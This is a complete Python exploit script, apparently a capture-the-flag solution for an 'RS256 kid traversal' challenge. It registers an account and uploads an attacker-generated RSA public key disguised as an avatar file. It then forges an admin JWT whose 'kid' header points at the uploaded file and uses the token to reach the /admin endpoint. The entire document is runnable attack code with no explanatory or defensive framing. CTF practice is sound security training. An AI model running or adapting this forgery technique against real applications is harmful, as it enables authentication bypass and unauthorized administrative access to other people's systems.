#!/usr/bin/env python3
import argparse
import os
import sys
import time
from dataclasses import dataclass
from typing import Tuple

import requests
import jwt
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa


@dataclass
class ExploitConfig:
    base_url: str
    username: str
    password: str


def gen_rsa_keypair() -> Tuple[bytes, bytes]:
    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    priv_pem = key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    )
    pub_pem = key.public_key().public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    return priv_pem, pub_pem


def register(cfg: ExploitConfig) -> None:
    r = requests.post(
        f"{cfg.base_url}/session/register",
        json={"username": cfg.username, "password": cfg.password},
        timeout=10,
    )
    if r.status_code not in (201, 409):
        raise RuntimeError(f"register failed: {r.status_code} {r.text}")


def login(cfg: ExploitConfig) -> str:
    r = requests.post(
        f"{cfg.base_url}/session/login",
        json={"username": cfg.username, "password": cfg.password},
        timeout=10,
    )
    r.raise_for_status()
    data = r.json()
    return data["token"]


def upload_avatar_with_pem(cfg: ExploitConfig, token: str, pub_pem: bytes) -> str:
    files = {
        "avatar": ("avatar.pem", pub_pem, "application/octet-stream"),
    }
    r = requests.post(
        f"{cfg.base_url}/account/avatar",
        headers={"Authorization": f"Bearer {token}"},
        files=files,
        timeout=15,
    )
    r.raise_for_status()
    data = r.json()
    return data["path"]


def make_admin_jwt(priv_pem: bytes, kid_path: str) -> str:
    headers = {"alg": "RS256", "kid": kid_path}
    payload = {"sub": "superadmin"}
    token = jwt.encode(payload, priv_pem, algorithm="RS256", headers=headers)
    return token


def get_flag(cfg: ExploitConfig, token: str) -> str:
    r = requests.get(
        f"{cfg.base_url}/admin",
        headers={"Authorization": f"Bearer {token}"},
        timeout=10,
    )
    r.raise_for_status()
    return r.json().get("flag")


def main():
    ap = argparse.ArgumentParser(description="Exploit for HSPACE RS256 kid traversal challenge")
    ap.add_argument("--base-url", required=True, help="e.g. http://host:25001")
    ap.add_argument("--username", default=None)
    ap.add_argument("--password", default=None)
    args = ap.parse_args()

    username = args.username or f"delta{int(time.time())}"
    password = args.password or "echo123!"

    cfg = ExploitConfig(base_url=args.base_url, username=username, password=password)

    register(cfg)
    user_token = login(cfg)

    priv_pem, pub_pem = gen_rsa_keypair()
    pem_path = upload_avatar_with_pem(cfg, user_token, pub_pem)
    evil_token = make_admin_jwt(priv_pem, pem_path)
    flag = get_flag(cfg, evil_token)

    if not flag:
        print("[-] exploit failed")
        sys.exit(2)
    print(flag)


if __name__ == "__main__":
    main()
